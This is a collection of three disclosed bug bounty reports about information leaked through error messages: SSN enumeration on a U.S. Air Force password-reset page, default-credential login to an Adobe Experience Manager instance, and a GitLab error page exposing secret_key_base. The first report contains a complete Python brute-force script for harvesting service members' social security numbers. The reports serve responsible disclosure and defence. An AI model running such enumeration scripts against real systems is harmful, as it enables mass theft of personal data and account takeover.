# Information Exposure Through an Error Message

_3 reports — High/Critical, disclosed_

### [Lack of rate limiting in https://███/PKI/PassReset.aspx leads to PII disclosure and potential account takeover](https://hackerone.com/reports/2748003)

- **Report ID:** `2748003`
- **Severity:** Critical
- **Weakness:** Information Exposure Through an Error Message
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hypervis0r
- **Bounty:** - usd
- **Disclosed:** 2024-10-25T16:05:12.582Z
- **CVE(s):** -

**Vulnerability Information:**

The password reset functionality of AFPC Secure is intended to be used by users who do not have a PKI credential for AFPC secure. It allows a user to provide their SSAN and Mother's Maiden Name to reset their password. The issue lies in the fact that if an SSAN for a user with an active PKI credential is found, the system will inform the user of that fact with the following error message:
```
Your account was found, but our records indicate you are either Military, Civilian, or a Contractor with a CAC, which you must use to reset your password. For more information, please click the link above labeled "Help with accessing AFPCSecure using a CAC"
```

Additionally, there is no rate limiting done for this site, meaning an attacker can brute force through approximately 772,000,000 social security numbers to find SSANs for active U.S. Air Force personnel. Furthermore, if any SSANs are found that aren't tied to active PKI credentials (i.e. authorized UserId/Password users, POW-MIA Next of Kin users), an attacker could potentially trigger a password reset by brute forcing the mother's maiden name field (for example, going through most common last names).

Please see the steps to reproduce for a proof-of-concept script that brute forces SSANs with the password reset functionality.

## Impact

This vulnerability can lead to the exposure of personally identifiable information for U.S. Air Force personnel, and can potentially lead to an account takeover in the right circumstances.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
See the following Python script for a proof-of-concept. The script will brute force through 772,000,000 SSANs by default, you can adjust the minimum and maximum search range on line 87. Uncomment line 84 to do a single SSAN search.

```python
import requests
from tqdm import tqdm
from bs4 import BeautifulSoup
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Get all the hidden ASP.NET inputs
def __get_hidden_input(content):
    """ Return the dict contain the hidden input 
    """
    tags = dict()
    soup =BeautifulSoup(content, 'html.parser')
    hidden_tags = soup.find_all('input', type='hidden')
    # print(*hidden_tags)
    for tag in hidden_tags:
        tags[tag.get('name')] = tag.get('value')
    
    return tags

url = "https://█████"

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36"}

session = requests.Session()

# Simulate ASP.NET post back function
def doPostBack(url, data):
    resp = session.get(url, headers=headers, verify=False)
    asp_info = __get_hidden_input(resp.text)

    asp_info.update(data)

    return session.post(url,  data=asp_info, headers=headers, verify=False)

# Click check portal button
data = {"btnOK": "OK"}
resp = doPostBack(url + "/CheckPortal.aspx", data)

# Go to forgot password page
data = {"__EVENTTARGET": "ctl00$cphPage$btnForgotPassword"}
resp = doPostBack(url + "/PKI/default.aspx", data)

# Go to password reset page
data = {"ctl00$cphPage$btnPOW": "Online Password Reset"}
resp = doPostBack(url + "/PKI/PassReset1.aspx", data)
print(resp.text)

# Get the ASP.NET inputs for the password reset page
asp_info = __get_hidden_input(resp.text)

def range_search(min=0, max=772000000):
    for ssan in tqdm(range(min, max)):
        data = asp_info
        data["ctl00$cphPage$txtSSAN"] = str(ssan).zfill(9)
        data["ctl00$phPage$txtMMN"] = "NONEXISTANT"
        data["ctl00$cphPage$btnSubmit"] = "Submit"

        resp = session.post(url + "/PKI/PassReset.aspx", data=data, verify=False, allow_redirects=False)

        if resp.status_code != 200:
            print(f"!! Error, resp code {resp.status_code}\n{resp.text}")

        if ("SSAN Does not match a ssan in our records." not in resp.text):
            print(f"[+] Found potential SSAN: {str(ssan).zfill(9)}")

def single_search(ssan):
    data = asp_info
    data["ctl00$cphPage$txtSSAN"] = str(ssan).zfill(9)
    data["ctl00$phPage$txtMMN"] = "NONEXISTANT"
    data["ctl00$cphPage$btnSubmit"] = "Submit"

    resp = session.post(url + "/PKI/PassReset.aspx", data=data, verify=False, allow_redirects=False)
    
    print(resp.text)

    if resp.status_code != 200:
        print(f"!! Error, resp code {resp.status_code}\n{resp.text}")

    if ("SSAN Does not match a ssan in our records." not in resp.text):
        print(f"[+] Found potential SSAN: {str(ssan).zfill(9)}")

# Single search, provide SSAN to test
#single_search(555001337)

# Range search, specify min/max to set range
range_search()
```

## Suggested Mitigation/Remediation Actions
Implement a rate limit for https://███████/. Additionally, adjust the error message to not give out more information than necessary.

---

### [Able to log in with default ██████g creds at  https█████████████████████.mil ](https://hackerone.com/reports/710813)

- **Report ID:** `710813`
- **Severity:** High
- **Weakness:** Information Exposure Through an Error Message
- **Program:** U.S. Dept Of Defense
- **Reporter:** @pirateducky
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:38:03.946Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary████**
was able to use ████████████████████████ to log into this instance of Adobe Experience Manager, though it does not seem to be in used at the moment 
**Description███████**
while navigating to https█████████████████████████.mil, I performed some fuzzing and found that `/repository` was available which asked for authentication using `███████████████████` worked and I could then access another path found by fuzing `lc` [link](https█████████████.mil/lc) which then showed me the ██████ panel. 

## Impact
Medium since it is not being used
## Step-by-step Reproduction Instructions

1. Navigate to  https████████████████.mil/repository 
2. use ████████████████ (username██████████password)
3. navigate to  https██████████████████████.mil/lc 

## Product, Version, and Configuration (If applicable)

Adobe Experience Manager

## Suggested Mitigation/Remediation Actions

Remove this application if it is not being used

## Impact

Medium - I was able to use █████████████ to log in 

Thanks

---

### [information disclosure of secret_key_base via encoding charcters](https://hackerone.com/reports/460545)

- **Report ID:** `460545`
- **Severity:** High
- **Weakness:** Information Exposure Through an Error Message
- **Program:** GitLab
- **Reporter:** @paresh_parmar
- **Bounty:** 3500 usd
- **Disclosed:** 2019-06-13T23:02:54.974Z
- **CVE(s):** -

**Summary (team):**

@paresh_parmar discovered an error page that was disclosing the value of the `secret_key_base` key of customers.gitlab.com to unauthenticated users, which would have allowed an attacker to arbitrarily decrypt signed cookies.

**Summary (researcher):**

So I was fuzzing one parameter with different type of encodings. And one character threw error page .that page has secret token (rails)of application.

you can get RCE using a secret key base token. BUT  in this case serialization  was json `action_dispatch.cookies_serializer"=>:json`  so RCE was not possible that time.  still, you can do lots of stuff with `secret_key_base`  of application, depends on the application logic.


 thanks to @bugdiscloseguys for help and similar issue by @bugdiscloseguys At: https://blog.harshjaiswal.com/rce-due-to-showexceptions

---
